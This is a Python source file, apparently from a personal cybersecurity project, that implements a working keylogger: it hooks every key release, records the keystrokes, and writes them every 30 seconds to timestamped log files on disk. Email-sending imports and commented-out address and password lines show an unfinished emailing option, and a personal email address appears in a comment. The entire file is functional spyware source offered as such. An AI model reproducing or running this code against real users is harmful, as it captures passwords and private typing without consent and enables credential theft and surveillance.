import keyboard  # for keylogs
import smtplib  # for sending email using SMTP protocol (gmail)
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 30  # in seconds, 60 means 1 minute and so on
# EMAIL_ADDRESS = "kapoorpiyush0103@outlook.com"
# EMAIL_PASSWORD = ""

class Keylogger:
    def __init__(self, interval, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.filename = self.generate_filename()

    def generate_filename(self):
        start_str = self.start_dt.strftime("%Y-%m-%d-%H-%M-%S")
        end_str = self.end_dt.strftime("%Y-%m-%d-%H-%M-%S")
        return f"D:/Cyber_security_projects/keylogger/keylog-{start_str}_{end_str}"

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.filename = self.generate_filename()
            self.report_to_file()
            self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def report_to_file(self):
        with open(f"{self.filename}.txt", "a") as f:
            f.write(self.log)

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        try:
            keyboard.wait()
        except KeyboardInterrupt:
            print(f"{datetime.now()} - Stopped keylogger")

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()

